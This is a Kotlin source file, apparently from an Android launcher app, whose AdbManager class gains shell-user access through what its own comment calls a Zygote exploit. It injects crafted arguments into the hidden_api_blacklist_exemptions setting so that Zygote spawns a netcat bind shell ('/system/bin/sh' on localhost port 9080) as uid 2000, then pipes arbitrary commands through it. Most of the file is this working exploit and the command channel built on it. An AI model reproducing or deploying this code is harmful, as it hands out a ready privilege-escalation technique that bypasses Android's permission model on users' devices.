package com.shrine.launcher.adb

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.BufferedWriter
import java.io.InputStreamReader
import java.io.OutputStreamWriter

/**
 * Shell access via Zygote exploit (no ADB/adbd involved).
 *
 * Requires WRITE_SECURE_SETTINGS granted once:
 *   adb shell pm grant com.shrine.launcher android.permission.WRITE_SECURE_SETTINGS
 *
 * On connect, writes a crafted string to hidden_api_blacklist_exemptions which causes
 * Zygote to spawn: toybox nc -s 127.0.0.1 -p 9080 -L /system/bin/sh -l
 * as uid=2000 (shell). Commands then run through a persistent nc connection to localhost:9080.
 */
class AdbManager private constructor(private val appContext: Context) {

    enum class AdbState { DISCONNECTED, CONNECTING, CONNECTED }

    companion object {
        private const val SHELL_PORT = 9080
        private const val SENTINEL_PREFIX = "##SHRINE_DONE##:"

        @Volatile private var instance: AdbManager? = null
        fun getInstance(context: Context): AdbManager =
            instance ?: synchronized(this) {
                instance ?: AdbManager(context.applicationContext).also { instance = it }
            }
    }

    var state: AdbState = AdbState.DISCONNECTED
        private set

    private var shellProcess: Process? = null
    private var shellWriter: BufferedWriter? = null
    private var shellReader: BufferedReader? = null

    fun hasPermission(): Boolean =
        appContext.checkSelfPermission("android.permission.WRITE_SECURE_SETTINGS") ==
                PackageManager.PERMISSION_GRANTED

    fun isConnected(): Boolean = state == AdbState.CONNECTED

    suspend fun doConnect(): ConnectResult = withContext(Dispatchers.IO) {
        state = AdbState.CONNECTING
        try {
            startShellListener()
            Thread.sleep(600)
            connectToShell()
            state = AdbState.CONNECTED
            ConnectResult(success = true)
        } catch (e: Exception) {
            state = AdbState.DISCONNECTED
            ConnectResult(success = false, error = e.message ?: "Unknown error")
        }
    }

    fun doDisconnect() {
        try { shellWriter?.close() } catch (_: Exception) {}
        try { shellReader?.close() } catch (_: Exception) {}
        try { shellProcess?.destroy() } catch (_: Exception) {}
        shellProcess = null
        shellWriter = null
        shellReader = null
        state = AdbState.DISCONNECTED
    }

    suspend fun executeShell(command: String, timeoutMs: Long = 10_000L): ShellResult = withContext(Dispatchers.IO) {
        if (!isConnected()) return@withContext ShellResult("Not connected", -1)
        try {
            val sentinel = "$SENTINEL_PREFIX${System.currentTimeMillis()}"
            // 2>&1 ensures stderr is captured alongside stdout
            shellWriter!!.write("($command 2>&1) ; echo \"$sentinel:\$?\"")
            shellWriter!!.newLine()
            shellWriter!!.flush()

            val output = StringBuilder()
            val deadline = System.currentTimeMillis() + timeoutMs
            while (System.currentTimeMillis() < deadline) {
                if (shellReader!!.ready()) {
                    val line = shellReader!!.readLine() ?: break
                    if (line.startsWith(sentinel)) {
                        val exitCode = line.removePrefix("$sentinel:").trim().toIntOrNull() ?: 0
                        return@withContext ShellResult(output.toString().trim(), exitCode)
                    }
                    output.appendLine(line)
                } else {
                    Thread.sleep(50)
                }
            }
            ShellResult(output.toString().trim(), -1)
        } catch (e: Exception) {
            state = AdbState.DISCONNECTED
            ShellResult("Connection lost: ${e.message}", -1)
        }
    }

    private fun startShellListener() {
        val exploit = buildString {
            append("LClass1;->method1(\n")
            append("10\n")
            append("--runtime-args\n")
            append("--setuid=2000\n")
            append("--setgid=2000\n")
            append("--runtime-flags=2049\n")
            append("--mount-external-full\n")
            append("--setgroups=3003\n")
            append("--nice-name=com.android.shell\n")
            append("--seinfo=platform:targetSdkVersion=${Build.VERSION.SDK_INT}:complete\n")
            append("--invoke-with\n")
            append("toybox nc -s 127.0.0.1 -p $SHELL_PORT -L /system/bin/sh -l;\n")
        }
        Settings.Global.putString(appContext.contentResolver, "hidden_api_blacklist_exemptions", exploit)
        try {
            ProcessBuilder("sh", "-c",
                "printf 'exit\\n' | toybox nc localhost $SHELL_PORT >/dev/null 2>&1 &")
                .start()
        } catch (_: Exception) {}
        Settings.Global.putString(appContext.contentResolver, "hidden_api_blacklist_exemptions", "")
        Settings.Global.putString(appContext.contentResolver, "hidden_api_blacklist_exemptions", null)
    }

    private fun connectToShell() {
        val process = ProcessBuilder("toybox", "nc", "localhost", "$SHELL_PORT")
            .redirectErrorStream(true)
            .start()
        shellProcess = process
        shellWriter = BufferedWriter(OutputStreamWriter(process.outputStream))
        shellReader = BufferedReader(InputStreamReader(process.inputStream))
    }

    // ── Legacy compat ──────────────────────────────────────────────────────────
    fun savedHost(): String = "localhost"
    fun savedPort(): Int = SHELL_PORT

    data class ConnectResult(val success: Boolean, val error: String? = null)
    data class ShellResult(val output: String, val exitCode: Int)
}
